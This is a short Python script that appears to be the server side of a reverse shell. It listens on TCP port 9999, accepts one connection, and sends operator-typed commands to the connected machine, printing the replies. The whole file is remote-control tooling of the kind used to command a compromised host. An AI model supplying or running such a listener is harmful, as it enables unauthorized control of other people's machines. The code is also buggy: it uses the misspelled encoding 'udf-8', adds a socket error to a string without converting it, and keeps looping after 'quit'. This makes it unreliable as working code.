"""
bleh
"""
import socket
import sys

print(sys.version)

global HOST
global PORT
global S

def create_socket():
    """
    b
    """
    try:
        global HOST
        global PORT
        global S
        HOST = ""
        PORT = 9999
        S = socket.socket()

    except socket.error as msg:
        print("socket creation error" + msg)

def bind_socket():
    try:
        global HOST
        global PORT
        global S

        print("Binding the Port " + str(PORT))

        S.bind((HOST,PORT))
        S.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "Retrying...")
        bind_socket()

def socket_accept():
    conn, address = S.accept()
    print("Connection has been established |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            S.close()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'udf-8')
            print(client_response, end = "")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()

